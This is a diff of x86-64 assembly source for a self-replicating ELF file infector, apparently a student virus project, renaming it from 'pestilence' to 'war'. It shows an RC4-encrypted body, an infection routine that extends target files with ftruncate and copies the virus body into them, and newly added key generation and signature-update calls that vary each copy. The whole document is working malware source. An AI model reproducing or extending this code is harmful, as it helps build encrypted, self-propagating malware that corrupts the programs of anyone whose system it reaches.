@@ -1,4 +1,4 @@
-%include "pestilence.inc"
+%include "war.inc"
 
 BITS 64
 default rel
@@ -9,6 +9,7 @@ section .text
 ; %rdi %rsi %rdx %r10 %r8 %r9
 
 _start:
+
     lea rax, [rel _stop]
     lea rcx, [rel _encrypted_start]
     sub rax, rcx
@@ -20,6 +21,7 @@ _start:
     jmp _encrypted_start
 
 %include "rc4.s"
+%include "gen_key.s"
 
 _encrypted_start:
 
@@ -106,7 +108,7 @@ _encrypted_start:
 	mov		rdi, r12
 	syscall
 	POP_ALL
-	mov		al, BYTE [rel zero]	; SI ICI = 0, ca signfiie c'est pestilence
+	mov		al, BYTE [rel zero]	; SI ICI = 0, ca signfiie c'est war
 	test	al, al
 	jz		.continue
 
@@ -422,7 +424,7 @@ print_rax:
 		pop		rax
 	ret
 
-	pestilence:
+	war:
 		push	r12
 		push	rax
 		push	rcx
@@ -532,7 +534,7 @@ print_rax:
 
 			
 
-			call	pestilence
+			call	war
 
 
 			push	rsi
@@ -894,7 +896,7 @@ infection:
 	mov byte [r14 + 0xa], 1
 
 	mov rax, [rel p_offset]
-	add rax, PESTILENCE_SIZE_NO_BSS
+	add rax, WAR_SIZE_NO_BSS
 	cmp rax, [rel file_size]
 	jbe .no_extend
 
@@ -906,7 +908,7 @@ infection:
 	mov rax, SYS_ftruncate
 	mov rdi, r12
 	mov rsi, [rel p_offset]
-	add rsi, PESTILENCE_SIZE_NO_BSS
+	add rsi, WAR_SIZE_NO_BSS
 	mov [rel file_size], rsi
 	syscall
 
@@ -925,9 +927,11 @@ infection:
 	push rsi
 	push rcx
 
+	call update_signature
+
 	mov rax, SYS_mmap
 	xor rdi, rdi
-	mov rsi, PESTILENCE_SIZE_NO_BSS
+	mov rsi, WAR_SIZE_NO_BSS
 	mov rdx, PROT_READ | PROT_WRITE
 	mov r10, MAP_PRIVATE | MAP_ANONYMOUS
 	mov r8, -1
@@ -940,11 +944,10 @@ infection:
 
 	mov rdi, rbx 
 	lea rsi, [rel _start]
-	mov rcx, PESTILENCE_SIZE_NO_BSS
+	mov rcx, WAR_SIZE_NO_BSS
 	rep movsb
 
 	mov rdi, rbx
-
 	lea rax, [rel _encrypted_start]
 	lea rcx, [rel _start]
 	sub rax, rcx
@@ -961,11 +964,11 @@ infection:
 	mov rdi, r14
 	add rdi, [rel p_offset]
 	mov rsi, rbx
-	mov rcx, PESTILENCE_SIZE_NO_BSS
+	mov rcx, WAR_SIZE_NO_BSS
 	rep movsb
 
 	mov rdi, rbx
-	mov rsi, PESTILENCE_SIZE_NO_BSS
+	mov rsi, WAR_SIZE_NO_BSS
 	mov rax, SYS_munmap
 	syscall
 
@@ -999,7 +1002,7 @@ end_:
 	je .just_quit
 
 
-	call	pestilence
+	call	war
 
 	mov		rax, SYS_open
 	lea		rdi, [rel self]
